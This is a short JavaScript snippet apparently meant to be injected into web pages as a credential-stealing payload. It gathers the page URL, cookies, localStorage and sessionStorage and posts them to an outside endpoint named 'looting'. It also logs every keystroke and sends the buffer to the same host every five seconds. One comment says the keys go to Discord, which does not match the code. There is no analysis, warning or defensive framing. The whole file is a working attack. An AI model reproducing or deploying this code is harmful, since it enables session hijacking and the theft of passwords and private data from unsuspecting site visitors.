(function() {
    const API_URL = "https://looting.pages.dev/api/loot";
    let keyBuffer = "";

    // 1. Function to send the main "Loot" (Cookies, Storage, URL)
    const sendLoot = () => {
        const data = {
            type: "INFO",
            url: window.location.href,
            cookies: document.cookie || "Protected/None",
            localStorage: JSON.stringify(localStorage).substring(0, 500),
            sessionStorage: JSON.stringify(sessionStorage).substring(0, 500)
        };

        fetch(API_URL, {
            method: "POST",
            mode: "cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    };

    // 2. Keylogger: Listen for typing and save it to a buffer
    document.addEventListener('keyup', (e) => {
        keyBuffer += e.key === "Enter" ? "[ENTER]\n" : e.key;
    });

    // 3. Interval: Every 5 seconds, send the typed keys to Discord
    setInterval(() => {
        if (keyBuffer.length > 0) {
            fetch(API_URL, {
                method: "POST",
                mode: "cors",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ type: "KEYS", url: window.location.href, keys: keyBuffer })
            });
            keyBuffer = ""; // Clear buffer after sending
        }
    }, 5000);

    // Initial trigger
    sendLoot();
})();
